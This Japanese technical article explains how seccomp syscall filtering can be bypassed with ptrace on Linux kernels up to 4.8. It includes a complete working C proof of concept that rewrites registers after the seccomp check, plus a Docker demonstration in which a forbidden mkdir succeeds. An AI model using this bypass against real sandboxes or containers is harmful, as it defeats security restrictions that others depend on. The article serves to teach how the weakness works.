# seccomp のバイパス

seccomp は特定のシステムコール呼び出しを制限する機構ですが、 **Linux Kernel 4.8 まで** は ptrace を使うことでバイパスすることができます。  
これは ptrace トレーサに通知される前（システムコールが呼び出されて実行される前）に seccomp フィルタが適用されるため、seccomp によって検査された後のレジスタを変更することで、制限されているシステムコールを呼び出すことができるという仕組みです。

具体的な手順としては次の通りです。

1. `fork(2)` で子プロセスで禁止されているシステムコールを実行し、親プロセス側でそのシステムコールの監視をする
2. システムコールが呼ばれたら別のシステムコールを呼び出すようにレジスタを書き換える
3. そのシステムコールが呼び出されたら、レジスタ状態を元に戻すことで禁止されたシステムコールを実行できる

コードにすると次の通りです。

```c
#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <unistd.h>
#include <ctype.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/user.h>
#include <sys/signal.h>
#include <sys/wait.h>
#include <sys/ptrace.h>
#include <sys/fcntl.h>
#include <syscall.h>


void die (const char *msg)
{
  perror(msg);
  exit(errno);
}

void attack()
{
  int rc;
  
  // mkdir("dir", 0777);
  syscall(SYS_getpid, SYS_mkdir, "dir", 0777); // 引数部分に SYS_mkdir とその引数を与えておく
}

int main()
{
  int pid;
  struct user_regs_struct regs;
  switch( (pid = fork()) ) {
    case -1:  die("Failed fork");
    case 0:
              // 親プロセスにトレースさせる
              ptrace(PTRACE_TRACEME, 0, NULL, NULL);
              kill(getpid(), SIGSTOP);
              attack();
              return 0;
  }

  waitpid(pid, 0, 0);

  while(1) {
    int st;
    // 子プロセスを再開する
    ptrace(PTRACE_SYSCALL, pid, NULL, NULL);
    if (waitpid(pid, &st, __WALL) == -1) {
      break;
    }

    if (!(WIFSTOPPED(st) && WSTOPSIG(st) == SIGTRAP)) {
      break;
    }

    ptrace(PTRACE_GETREGS, pid, NULL, &regs);
    printf("orig_rax = %lld\n", regs.orig_rax);

    // syscall-enter-stop であればスキップ
    if (regs.rax != -ENOSYS) {
      continue;
    }

    // レジスタの内容を変更してシステムコールを変更する
    if (regs.orig_rax == SYS_getpid) {
      regs.orig_rax = regs.rdi;
      regs.rdi = regs.rsi;
      regs.rsi = regs.rdx;
      regs.rdx = regs.r10;
      regs.r10 = regs.r8;
      regs.r8 = regs.r9;
      regs.r9 = 0;
      ptrace(PTRACE_SETREGS, pid, NULL, &regs);
    }
  }
  return 0;
}
```

`mkdir(2)` を禁止する seccomp profile を適用したコンテナを作成します。

```sh
$ cat seccomp.json | jq 
{
  "defaultAction": "SCMP_ACT_ALLOW",
  "syscalls": [
    {
      "name": "mkdir",
      "action": "SCMP_ACT_ERRNO",
      "args": []
    }
  ]
}

$ docker run -it --security-opt seccomp:seccomp.json ubuntu:latest bash
```

そのコンテナの中で上記コードを実行すると seccomp の制限をバイパスして `mkdir(2)` を実行することが確認できます。

```sh
[root@d7799354119f tmp]# mkdir dir
mkdir: cannot create directory 'dir': Operation not permitted

[root@d7799354119f tmp]# ./a.out
orig_rax = 39
orig_rax = 83
orig_rax = 231
[root@d75f3506a41d tmp]# ls
a.out  dir
```
